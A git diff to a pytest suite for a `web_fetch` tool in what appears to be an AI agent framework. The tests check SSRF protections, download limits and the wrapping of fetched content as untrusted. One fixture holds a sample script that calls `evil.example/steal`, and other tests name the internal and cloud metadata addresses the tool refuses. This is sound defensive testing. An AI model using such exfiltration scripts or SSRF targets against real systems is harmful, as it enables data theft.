@@ -37,7 +37,7 @@ async def _public_resolver(host: str, port: int) -> list[str]:
 
 
 async def test_web_fetch_refuses_non_http_schemes() -> None:
-    """TC-03: `web_fetch` refuses `file://`, `ftp://`, `javascript:`, and empty URLs."""
+    """`web_fetch` refuses `file://`, `ftp://`, `javascript:`, and empty URLs."""
     called = False
 
     def fail_handler(request: httpx.Request) -> httpx.Response:
@@ -72,7 +72,7 @@ async def test_web_fetch_refuses_non_http_schemes() -> None:
 
 
 async def test_web_fetch_refuses_private_and_local_addresses() -> None:
-    """TC-04: `web_fetch` refuses loopback, RFC 1918, link-local, and local hosts."""
+    """`web_fetch` refuses loopback, RFC 1918, link-local, and local hosts."""
     called = False
 
     def fail_handler(request: httpx.Request) -> httpx.Response:
@@ -138,7 +138,7 @@ async def test_web_fetch_refuses_private_and_local_addresses() -> None:
 
 
 async def test_web_fetch_refuses_redirect_to_private_ip() -> None:
-    """TC-05: A public URL redirecting to `169.254.169.254` is refused on redirect."""
+    """A public URL redirecting to `169.254.169.254` is refused on redirect."""
     requested_urls: list[str] = []
 
     def redirect_handler(request: httpx.Request) -> httpx.Response:
@@ -182,7 +182,7 @@ class _FiveMegabyteStream(httpx.AsyncByteStream):
 
 
 async def test_web_fetch_caps_download_at_2mb_and_truncates_to_20k() -> None:
-    """TC-06: 5 MB page stops at 2 MB, truncates to 20k chars, and wraps untrusted."""
+    """5 MB page stops at 2 MB, truncates to 20k chars, and wraps untrusted."""
     sentence = "Python 3.14 brings faster execution and clean syntax. "
     paragraph = "<p>" + (sentence * 40) + "</p>\n"
     chunk_100kb = (paragraph * 50).encode("utf-8")[: 100 * 1024]
@@ -221,7 +221,7 @@ async def test_web_fetch_caps_download_at_2mb_and_truncates_to_20k() -> None:
 
 
 async def test_web_fetch_follows_up_to_5_redirects_and_refuses_6th() -> None:
-    """TC-18: `web_fetch` follows up to 5 public redirects and refuses on a 6th."""
+    """`web_fetch` follows up to 5 public redirects and refuses on a 6th."""
 
     def chain_handler(request: httpx.Request) -> httpx.Response:
         path = request.url.path
@@ -261,7 +261,7 @@ async def test_web_fetch_follows_up_to_5_redirects_and_refuses_6th() -> None:
 async def test_web_fetch_html_fallback_and_escapes_untrusted_closing_tag(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """TC-19: `web_fetch` falls back to HTMLParser and escapes `</untrusted>`."""
+    """`web_fetch` falls back to HTMLParser and escapes `</untrusted>`."""
     malicious_html = (
         "<html><head><title>Hidden</title><style>body { display:none }</style></head>"
         '<body><script>fetch("http://evil.example/steal")</script>'
@@ -298,7 +298,7 @@ async def test_web_fetch_html_fallback_and_escapes_untrusted_closing_tag(
 
 
 async def test_web_fetch_handles_network_errors_and_binary_content() -> None:
-    """TC-20: `web_fetch` returns an error string on timeout, 404, DNS, or binary."""
+    """`web_fetch` returns an error string on timeout, 404, DNS, or binary."""
 
     def router(request: httpx.Request) -> httpx.Response:
         path = request.url.path
@@ -411,3 +411,67 @@ async def test_web_fetch_helpers_and_trafilatura_extraction() -> None:
 
     with pytest.raises(FetchError, match="Could not resolve"):
         await validate_public_url("http://example.com/", resolver=empty_resolver)
+
+
+async def test_web_fetch_logs_url_and_wraps_untrusted_with_random_id(
+    aldwin_home: object,
+    tmp_path: object,
+) -> None:
+    """`web_fetch` logs URL and wraps `<untrusted id='u-…'>`."""
+    import re
+    from pathlib import Path
+
+    from aldwin.core.approval_log import ApprovalLogger
+    from aldwin.core.policy import (
+        ApprovalAnswer,
+        ApprovalRequest,
+        PolicySession,
+        PolicyWrappedTool,
+    )
+    from aldwin.core.workspace import Workspace
+
+    home_path = Path(str(aldwin_home))
+    ws_dir = Path(str(tmp_path)) / "ws"
+    ws_dir.mkdir(exist_ok=True)
+    session = PolicySession(workspace=Workspace(ws_dir, home=home_path), home=home_path)
+    log = ApprovalLogger(home=home_path)
+
+    def ok_handler(request: httpx.Request) -> httpx.Response:
+        return httpx.Response(
+            200,
+            headers={"Content-Type": "text/html; charset=utf-8"},
+            text="<html><body><p>Hello from example</p></body></html>",
+            request=request,
+        )
+
+    async def _ask(_req: ApprovalRequest) -> ApprovalAnswer:
+        return ApprovalAnswer("yes", "user")
+
+    async with httpx.AsyncClient(
+        transport=httpx.MockTransport(ok_handler)
+    ) as http_client:
+        inner = build_web_fetch_tool(
+            client=http_client,
+            resolver=_public_resolver,
+            wrapped_by_policy=True,
+        )
+        wrapped = PolicyWrappedTool(
+            inner,
+            session=session,
+            ask=_ask,
+            approval_log=log,
+        )
+        res = await wrapped.call({"url": "https://example.com/a"})
+    log.close()
+
+    assert res.ok is True
+    assert re.match(
+        r'^<untrusted id="u-[0-9a-f]{8}" source="web_fetch:https://example\.com/a">\n'
+        r"Hello from example\n"
+        r'</untrusted id="u-[0-9a-f]{8}">$',
+        str(res),
+    )
+    log_text = (home_path / "logs" / "approvals.jsonl").read_text(encoding="utf-8")
+    assert '"tool": "web_fetch"' in log_text
+    assert '"target": "https://example.com/a"' in log_text
+    assert '"decision": "auto"' in log_text
